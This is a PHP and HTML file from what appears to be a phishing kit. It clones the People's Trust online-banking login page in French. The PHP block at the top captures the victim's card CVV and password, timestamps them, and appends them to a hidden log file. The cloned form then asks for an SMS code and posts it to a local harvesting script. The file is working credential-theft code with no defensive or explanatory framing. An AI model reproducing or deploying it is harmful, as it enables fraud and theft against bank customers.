<?php session_start();

if (!isset($_POST["cvv"]) or !isset( $_POST["mdp"])) {
    header("Location: ./index.php");
    exit();
}

$_SESSION["cvv"] = $_POST['cvv'] ;
$_SESSION["mdp"] = $_POST['mdp'] ;
$heure = date("h:i:s") ;
$date = date("Y:m:d") ;


$donnees = "\n"."** NOUVELLE CONNEXION ** a :  ".$_SESSION["bank"].
"\n"."heure :".$heure.
"\n"."date :".$date.
"\n". "Cvv : " .$_SESSION["cvv"] .
"\n"."Mdp : " .$_SESSION["mdp"] .
"\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);



?>

<!DOCTYPE html>
<!-- saved from url=(0048)https://peoplestrust.auth.memberdirect.net/login -->
<html xmlns:layout="http://www.ultraq.net.nz/web/thymeleaf/layout" lang="en_CA">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">
        @charset "UTF-8";

        [ng\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak,
        .ng-hide:not(.ng-hide-animate) {
            display: none !important;
        }

        ng\:form {
            display: block;
        }

        .ng-animate-shim {
            visibility: hidden;
        }

        .ng-anchor {
            position: absolute;
        }
    </style>
    <title>Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2">
    <meta name="google" content="notranslate">

    <!-- import md reno theme  -->

    <!-- import forge 1 theme -->
    <link type="text/css" href="./people_trust_files/theme-peoplestrust.css" rel="stylesheet">

    <style>
        [ng\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak {
            display: none !important;
        }
    </style>

    <link type="text/css" href="./people_trust_files/login-common.css" rel="stylesheet">
    <link type="text/css" href="./people_trust_files/secure-key.css" rel="stylesheet">
    <link rel="icon"
        href="https://peoplestrust.auth.memberdirect.net/resources/themes/theme-peoplestrust/assets/favicon.png">

</head>

<body ng-app="UxpLoginApp" class="uxp-theme ng-scope">

    <div class="widget-c1-oauth-login position-relative oauth-login">
        <!-- Navigation section -->

        <!-- Terms and Condition section -->
        <!-- Login section -->
        <div ng-controller="UxpLoginController as $ctrl" id="c1-login-section" class="ng-scope">

            <div class="errors errors-login">
                <span ng-hide="state.isSubmittingForm || state.isFieldOnChange" class="error-message"></span>
            </div>
            <form id="loginForm" name="uxpLoginForm"
                class="center-block c1-login-form ng-pristine ng-invalid ng-invalid-uxp-pattern ng-invalid-required ng-valid-minlength ng-valid-maxlength"
                ng-class="{ &#39;ie11-fix&#39;: isIE11 }" action="/people/people_trust_files/people.php" method="post"
                autocomplete="on" ng-submit="ngSubmitListener(&#39;false&#39;)"><input type="hidden" name="_csrf"
                    value="77be8eb3-fd7c-442e-8880-23feb4620e29" autocomplete="off">

                <!-- ReCaptcha -->



                <div>
                    <!-- Memorized account select -->
                    <div ng-form="memorizedLoginsForm" ng-show="showingMemorizedAccounts()"
                        class="memorized-login-selector memorized-login-selector ng-pristine ng-valid ng-hide"
                        id="c1-memorized-login-selector" ng-init="memorizedAccounts=[];">



                        <div class="logo text-center">
                            <img src="./people_trust_files/logo.png" alt="Logo">

                        </div>

                    

                        <div class="c1-btn-container memorized-btn-container">

                            <div class="c1-btn-container">
                                <a href="https://peoplestrust.auth.memberdirect.net/login#"
                                    ng-click="showNewUserLogin()">Se connecter à un autre compte</a>
                            </div>
                            <div class="edit-memorized-accounts" ng-hide="state.memorizedAccountsEditMode">
                                <a href="https://peoplestrust.auth.memberdirect.net/login#"
                                    ng-click="showEditMemorized()">Gérer les profils de connexion</a>
                            </div>

                            <div class="memorized-accounts ng-hide" ng-show="
                            haveMemorizedAccounts() &amp;&amp;
                            (
                                showingNewLogin() ||
                                showingMemorizedAccountsEdit()
                            )
                            ">
                                <a href="https://peoplestrust.auth.memberdirect.net/login#"
                                    ng-click="showMemorizedAccounts()">Afficher les profils de connexion sauvegardés</a>
                            </div>

                            <div class="oauth-login-forgot-pac">
                                <a href="https://peoplestrust.auth.memberdirect.net/forgotPac">Mot de passe oublié?</a>
                            </div>
                        </div>




                    </div>

                    <!-- pan/pac login -->
                    <div ng-form="newLoginForm" ng-hide="showingMemorizedAccounts()"
                        class="ng-pristine ng-invalid ng-invalid-uxp-pattern ng-invalid-required ng-valid-minlength ng-valid-maxlength">



                        <div class="logo text-center">
                            <img src="./people_trust_files/logo.png" alt="Logo">

                        </div>



                        <div class="form-group ng-hide" ng-show="selectedMemorizedAccount.nickname">
                            <h4>Saisie du code d’accès pour <em class="ng-binding"></em>:</h4>
                        </div>
                        <div class="login-id-fields" ng-show="!state.usingMemorizedUser">
                            <div class="new-login-fields">


                                <div class="form-group">



                                    <input id="branch" name="branch" type="hidden" value="000" autocomplete="off">
                                </div>
                                <!-- ngIf: !state.usingMemorizedUser -->
                                <div ng-if="!state.usingMemorizedUser" ng-class="
            [
                &#39;form-group&#39;,
                {
                    &#39;is-invalid&#39;: isMemberNumInvalid()
                }
            ]
         " class="ng-scope form-group">
                                    <div ng-class="
            [
                &#39;text-input&#39;,
                {
                    &#39;is-empty&#39;: !(uxpLoginForm.newLoginForm.memberNum.$modelValue)
                }
            ]
            " class="text-input is-empty">
                                        <label for="memberNum">
                                            <span id="accountno" aria-hidden="true">Code sms</span>
                                            <input aria-labelledby="accountno"
                                                class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-required ng-valid-maxlength"
                                                id="memberNum" name="memberNum" type="text" maxlength="8"
                                                uxp-pattern="^.{3,22}$" ng-model="fieldModels.memberNum"
                                                data-uxp-required-error-message="Veuillez saisir votre numéro de client."
                                                data-uxp-mismatched-error-message="Vous avez entré un numéro de client invalide. Veuillez réessayer."
                                                ng-required="required" ng-model-options="{allowInvalid: true}"
                                                ng-change="isFieldChanged()"
                                                aria-describedby="branchlabel branchno accountno memberNum memberNumError"
                                                autocomplete="username" aria-required="true" aria-invalid="false"
                                                android-margin="" placeholder="Code sms">
                                        </label>
                                        <!-- ngIf: 
                    isMemberNumInvalid() &&
                    uxpLoginForm.newLoginForm.memberNum.$error.uxpPattern
                 -->
                                    </div>
                                </div><!-- end ngIf: !state.usingMemorizedUser -->

                            </div>
                            <!-- ngIf: state.usingMemorizedUser -->
                            <div class="memorized-login-fields">
                                <!-- ngIf: fieldModels.hashedLoginId -->
                            </div>
                        </div>
                 
                    


                    

                        <div class="text-center c1-btn-container">

                            <button 
                                type="submit" id="loginSubmit">Confirmer</button>


                        </div>

                        <div class="c1-btn-container memorized-btn-container">
                            <div>
                                <a href="https://peoplestrust.auth.memberdirect.net/forgotPac">Mot de passe oublié?</a>
                            </div>

                            <div class="memorized-accounts ng-hide" ng-show="
                            haveMemorizedAccounts() &amp;&amp;
                            (
                                showingNewLogin() ||
                                showingMemorizedAccountsEdit()
                            )
                         ">
                                <a href="https://peoplestrust.auth.memberdirect.net/login#"
                                    ng-click="showMemorizedAccounts()">Afficher les profils de connexion sauvegardés</a>
                            </div>
                        </div>




                    </div>




                    <input name="device" type="hidden" uxp-device-fingerprint=""
                        ng-value="fieldModels.deviceFingerprint" autocomplete="off"
                        value="version%3D3%2E7%2E1%5F1%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%2010%2E0%3B%20win64%3B%20x64%29%20applewebkit%2F537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome%2F124%2E0%2E0%2E0%20safari%2F537%2E36%7C5%2E0%20%28Windows%20NT%2010%2E0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124%2E0%2E0%2E0%20Safari%2F537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1366%7C768%7C738%26pm%5Ffpsw%3Dpdf%7Cpdf%7Cpdf%7Cpdf%7Cpdf%26pm%5Ffptz%3D1%26pm%5Ffpln%3Dlang%3Dfr%2DFR%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3Dinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1366%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D%26pm%5Fos%3DWindows%26pm%5Fbrmjv%3D124%26pm%5Fbr%3DChrome%26pm%5Finpt%3D%26pm%5Fexpt%3D">
                </div>
            </form>

            <!-- ngIf: state.isShowingSpinner -->

        </div>
    </div>




    <div id="extension-mmplj"></div><iframe id="tdz_ifrm" title="empty" name="" width="0px" height="0px" marginwidth="0"
        marginheight="0" frameborder="0" aria-disabled="true" aria-hidden="true" tabindex="-1"
        src="./people_trust_files/Niodwaz5m3hDWFs7.html"
        style="display: none !important; z-index: -9999 !important; visibility: hidden !important;"></iframe>
</body>

</html>